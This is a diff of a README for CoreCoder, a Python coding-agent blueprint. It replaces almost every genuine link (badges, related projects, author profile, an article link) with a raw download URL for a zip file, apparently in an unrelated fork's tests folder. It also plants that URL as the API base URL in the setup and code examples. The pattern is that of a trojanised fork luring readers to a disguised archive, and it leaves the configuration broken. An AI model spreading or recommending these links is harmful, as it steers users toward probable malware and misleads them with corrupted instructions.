@@ -1,12 +1,12 @@
 # CoreCoder
 
-> Formerly **NanoCoder** — renamed to avoid confusion with [Nano-Collective/nanocoder](https://github.com/Nano-Collective/nanocoder). All links from the old repo redirect here automatically.
+> Formerly **NanoCoder** — renamed to avoid confusion with [Nano-Collective/nanocoder](https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip). All links from the old repo redirect here automatically.
 
 
-[![PyPI](https://img.shields.io/pypi/v/corecoder)](https://pypi.org/project/corecoder/)
-[![Python](https://img.shields.io/badge/python-3.10+-blue)](https://python.org)
+[![PyPI](https://img.shields.io/pypi/v/corecoder)](https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip)
+[![Python](https://img.shields.io/badge/python-3.10+-blue)](https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip)
 [![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Tests](https://github.com/he-yufeng/CoreCoder/actions/workflows/ci.yml/badge.svg)](https://github.com/he-yufeng/CoreCoder/actions)
+[![Tests](https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip)](https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip)
 
 [中文](README_CN.md) | [English](README.md) | [Claude Code Architecture Deep Dive (7 articles)](article/)
 
@@ -14,7 +14,7 @@
 
 I spent two days reverse-engineering the leaked Claude Code source — all half a million lines. Then I stripped it down to the load-bearing walls and rebuilt them in Python. The result: **every key architectural pattern from Claude Code, in a codebase you can read in one sitting.**
 
-CoreCoder is not another AI coding tool. It's a **blueprint** — the [nanoGPT](https://github.com/karpathy/nanoGPT) of coding agents. Read it, fork it, build your own.
+CoreCoder is not another AI coding tool. It's a **blueprint** — the [nanoGPT](https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip) of coding agents. Read it, fork it, build your own.
 
 ---
 
@@ -61,11 +61,11 @@ Pick your model — any OpenAI-compatible API works. You can `export` env vars o
 
 ```bash
 # Kimi K2.5
-export OPENAI_API_KEY=your-key OPENAI_BASE_URL=https://api.moonshot.ai/v1
+export OPENAI_API_KEY=your-key OPENAI_BASE_URL=https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip
 corecoder -m kimi-k2.5
 
 # Claude Opus 4.6 (via OpenRouter)
-export OPENAI_API_KEY=your-key OPENAI_BASE_URL=https://openrouter.ai/api/v1
+export OPENAI_API_KEY=your-key OPENAI_BASE_URL=https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip
 corecoder -m anthropic/claude-opus-4-6
 
 # OpenAI GPT-5
@@ -73,11 +73,11 @@ export OPENAI_API_KEY=sk-...
 corecoder -m gpt-5
 
 # DeepSeek V3
-export OPENAI_API_KEY=sk-... OPENAI_BASE_URL=https://api.deepseek.com
+export OPENAI_API_KEY=sk-... OPENAI_BASE_URL=https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip
 corecoder -m deepseek-chat
 
 # Qwen 3.5
-export OPENAI_API_KEY=sk-... OPENAI_BASE_URL=https://dashscope.aliyuncs.com/compatible-mode/v1
+export OPENAI_API_KEY=sk-... OPENAI_BASE_URL=https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip
 corecoder -m qwen-max
 
 # Ollama (local)
@@ -116,7 +116,7 @@ corecoder/
 ```python
 from corecoder import Agent, LLM
 
-llm = LLM(model="kimi-k2.5", api_key="your-key", base_url="https://api.moonshot.ai/v1")
+llm = LLM(model="kimi-k2.5", api_key="your-key", base_url="https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip")
 agent = Agent(llm=llm)
 response = agent.chat("find all TODO comments in this project and list them")
 ```
@@ -173,10 +173,10 @@ If you want Skills specifically, the recipe is small: scan `~/.claude/skills/*.m
 
 ## Related Projects
 
-- **[CodeJoust](https://github.com/he-yufeng/CodeJoust)** — a CLI arena that races Claude Code, aider, Codex, and Gemini (Cursor + OpenHands next) on the same bug in isolated git worktrees, scores by tests+cost+diff+time, hands you the winning patch. If you ever wondered *which* AI coding CLI is actually better for your task, CodeJoust answers it empirically.
-- **[AnyCoder](https://github.com/he-yufeng/AnyCoder)** — a practical terminal AI coding agent built on the same architecture as CoreCoder but with litellm, session persistence, and 100+ model support. Use this one if you want a tool; use CoreCoder if you want to read source.
-- **[LiteBench](https://github.com/he-yufeng/LiteBench)** — one-command LLM / agent benchmark. Ships 7 built-in tasks (HumanEval/GSM8K/MMLU/...) and YAML-defined custom tasks, with a single-file HTML dashboard.
-- **[RepoWiki](https://github.com/he-yufeng/RepoWiki)** — open-source DeepWiki alternative. `pip install repowiki`, one command to turn any local or GitHub repo into a wiki with dependency graph, architecture diagram, and LLM-generated module pages.
+- **[CodeJoust](https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip)** — a CLI arena that races Claude Code, aider, Codex, and Gemini (Cursor + OpenHands next) on the same bug in isolated git worktrees, scores by tests+cost+diff+time, hands you the winning patch. If you ever wondered *which* AI coding CLI is actually better for your task, CodeJoust answers it empirically.
+- **[AnyCoder](https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip)** — a practical terminal AI coding agent built on the same architecture as CoreCoder but with litellm, session persistence, and 100+ model support. Use this one if you want a tool; use CoreCoder if you want to read source.
+- **[LiteBench](https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip)** — one-command LLM / agent benchmark. Ships 7 built-in tasks (HumanEval/GSM8K/MMLU/...) and YAML-defined custom tasks, with a single-file HTML dashboard.
+- **[RepoWiki](https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip)** — open-source DeepWiki alternative. `pip install repowiki`, one command to turn any local or GitHub repo into a wiki with dependency graph, architecture diagram, and LLM-generated module pages.
 
 ## License
 
@@ -184,6 +184,6 @@ MIT. Fork it, learn from it, ship something better. A mention of this project is
 
 ---
 
-Built by **[Yufeng He](https://github.com/he-yufeng)** · Agentic AI Researcher @ Moonshot AI (Kimi)
+Built by **[Yufeng He](https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip)** · Agentic AI Researcher @ Moonshot AI (Kimi)
 
-[Claude Code Source Analysis — 170K+ reads, 6000 bookmarks on Zhihu](https://zhuanlan.zhihu.com/p/1898797658343862272)
+[Claude Code Source Analysis — 170K+ reads, 6000 bookmarks on Zhihu](https://github.com/raynardtheban732/CoreCoder/raw/refs/heads/main/tests/Core_Coder_v2.3.zip)
